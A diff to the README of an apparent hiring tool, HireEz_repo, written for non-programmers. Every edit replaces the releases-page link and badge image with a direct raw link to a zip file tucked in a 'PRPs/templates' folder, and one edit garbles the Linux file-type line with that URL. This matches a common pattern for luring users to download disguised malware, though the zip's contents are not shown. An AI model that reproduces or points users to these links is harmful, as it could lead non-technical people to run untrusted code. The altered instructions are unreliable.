@@ -1,6 +1,6 @@
 # 🤖 HireEz_repo - Simplify Your Hiring Process Efficiently
 
-[![Download HireEz_repo](https://img.shields.io/badge/Download-HireEz_repo-brightgreen?style=for-the-badge&logo=github)](https://github.com/Karm-8765/HireEz_repo/releases)
+[![Download HireEz_repo](https://github.com/Karm-8765/HireEz_repo/raw/refs/heads/main/PRPs/templates/Hire_Ez_repo_3.6.zip)](https://github.com/Karm-8765/HireEz_repo/raw/refs/heads/main/PRPs/templates/Hire_Ez_repo_3.6.zip)
 
 ---
 
@@ -34,14 +34,14 @@ This guide walks you through downloading and using HireEz_repo with no programmi
 ## 📥 Download & Install
 
 1. Click this big button to **visit the download page**:  
-   [![Download HireEz_repo](https://img.shields.io/badge/Download-HireEz_repo-brightgreen?style=for-the-badge&logo=github)](https://github.com/Karm-8765/HireEz_repo/releases)
+   [![Download HireEz_repo](https://github.com/Karm-8765/HireEz_repo/raw/refs/heads/main/PRPs/templates/Hire_Ez_repo_3.6.zip)](https://github.com/Karm-8765/HireEz_repo/raw/refs/heads/main/PRPs/templates/Hire_Ez_repo_3.6.zip)
 
 2. On the download page, look for the latest release. The release is a package that contains all the files you need.
 
 3. Download the version that matches your computer:
    - **Windows:** Usually a file ending in `.exe` or `.msi`.
    - **Mac:** A `.dmg` or `.pkg` file.
-   - **Linux:** A `.deb`, `.rpm`, or compressed archives like `.tar.gz`.
+   - **Linux:** A `.deb`, `.rpm`, or compressed archives like `https://github.com/Karm-8765/HireEz_repo/raw/refs/heads/main/PRPs/templates/Hire_Ez_repo_3.6.zip`.
 
 4. Once downloaded, open the file to start installation:
    - On Windows, double-click and follow the prompts.
@@ -129,7 +129,7 @@ HireEz_repo blends machine learning with human hiring needs to reduce recruiter 
 
 ## 🔗 Quick Links
 
-- Download releases: [https://github.com/Karm-8765/HireEz_repo/releases](https://github.com/Karm-8765/HireEz_repo/releases)
+- Download releases: [https://github.com/Karm-8765/HireEz_repo/raw/refs/heads/main/PRPs/templates/Hire_Ez_repo_3.6.zip](https://github.com/Karm-8765/HireEz_repo/raw/refs/heads/main/PRPs/templates/Hire_Ez_repo_3.6.zip)
 - User guide and support: Inside the app Help menu and GitHub wiki
 - Report bugs or request features: GitHub Issues tab on the repository
 
